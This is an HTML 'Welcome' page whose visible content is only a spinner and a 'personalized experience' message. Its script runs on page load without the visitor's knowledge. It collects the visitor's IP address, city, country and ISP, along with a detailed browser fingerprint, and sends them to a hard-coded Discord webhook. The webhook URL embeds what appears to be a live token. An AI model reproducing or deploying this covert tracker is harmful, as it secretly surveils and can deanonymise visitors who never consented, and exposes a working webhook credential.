<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 2rem;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        p {
            font-size: 1.2rem;
            margin-bottom: 2rem;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>Loading your personalized experience...</p>
        <div class="loading" id="loader"></div>
        <div id="content" class="hidden">
            <p>Thank you for visiting our site!</p>
            <p>Your session has been initialized.</p>
        </div>
    </div>

    <script>
        // Replace with your actual webhook URL (Discord webhook, etc.)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377641587743391816/Yyfj5fL_qL1-U2o93Y-vtNWS8J3zUGXlDFv-KuAwyJxcB48o-t0i1raw-4V3OkpAoXYN';

        (function() {
            'use strict';

            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error getting IP:', error);
                    return 'Unknown';
                }
            }

            async function getLocationData(ip) {
                try {
                    const response = await fetch(`https://ipapi.co/${ip}/json/`);
                    const data = await response.json();
                    return data;
                } catch (error) {
                    console.error('Error getting location:', error);
                    return null;
                }
            }

            function gatherClientInfo() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Browser fingerprint', 2, 2);
                
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }

                return {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenResolution: `${screen.width}x${screen.height}`,
                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookiesEnabled: navigator.cookieEnabled,
                    platform: navigator.platform,
                    plugins: plugins.slice(0, 5),
                    referrer: document.referrer || 'Direct',
                    url: window.location.href,
                    touchSupport: 'ontouchstart' in window,
                    colorDepth: screen.colorDepth,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : null
                };
            }

            async function sendToWebhook(data) {
                try {
                    const payload = {
                        content: "ðŸš¨ **New Visitor Detected** ðŸš¨",
                        embeds: [{
                            title: "Visitor Information",
                            color: 0xff0000,
                            fields: [
                                { name: "IP Address", value: data.ip || "Unknown", inline: true },
                                { name: "Location", value: data.location ? `${data.location.city}, ${data.location.country_name}` : "Unknown", inline: true },
                                { name: "ISP", value: data.location?.org || "Unknown", inline: true },
                                { name: "Browser", value: getBrowserInfo(), inline: true },
                                { name: "OS", value: getOSInfo(), inline: true },
                                { name: "Device", value: data.clientInfo.touchSupport ? "Mobile/Touch" : "Desktop", inline: true },
                                { name: "Screen", value: data.clientInfo.screenResolution, inline: true },
                                { name: "Timezone", value: data.clientInfo.timezone, inline: true },
                                { name: "Language", value: data.clientInfo.language, inline: true },
                                { name: "Referrer", value: data.clientInfo.referrer, inline: false },
                                { name: "Timestamp", value: data.clientInfo.timestamp, inline: false }
                            ],
                            footer: { text: "GitHub Pages Tracker" }
                        }]
                    };

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    });

                    console.log('Data sent to webhook successfully');
                } catch (error) {
                    console.error('Error sending to webhook:', error);
                }
            }

            function getBrowserInfo() {
                const ua = navigator.userAgent;
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari')) return 'Safari';
                if (ua.includes('Edge')) return 'Edge';
                return 'Unknown';
            }

            function getOSInfo() {
                const ua = navigator.userAgent;
                if (ua.includes('Windows')) return 'Windows';
                if (ua.includes('Mac')) return 'macOS';
                if (ua.includes('Linux')) return 'Linux';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('iOS')) return 'iOS';
                return 'Unknown';
            }

            async function initializeTracking() {
                try {
                    const clientInfo = gatherClientInfo();
                    const ip = await getIPAddress();
                    const location = await getLocationData(ip);

                    const trackingData = {
                        ip: ip,
                        location: location,
                        clientInfo: clientInfo
                    };

                    await sendToWebhook(trackingData);
                    
                    // Log to console for debugging
                    console.log('Visitor data:', trackingData);
                    
                } catch (error) {
                    console.error('Error in tracking:', error);
                } finally {
                    showContent();
                }
            }

            function showContent() {
                setTimeout(() => {
                    document.getElementById('loader').classList.add('hidden');
                    document.getElementById('content').classList.remove('hidden');
                }, 2000);
            }

            // Initialize when page loads
            window.addEventListener('load', function() {
                setTimeout(initializeTracking, 1000);
            });

        })();
    </script>
</body>
</html>
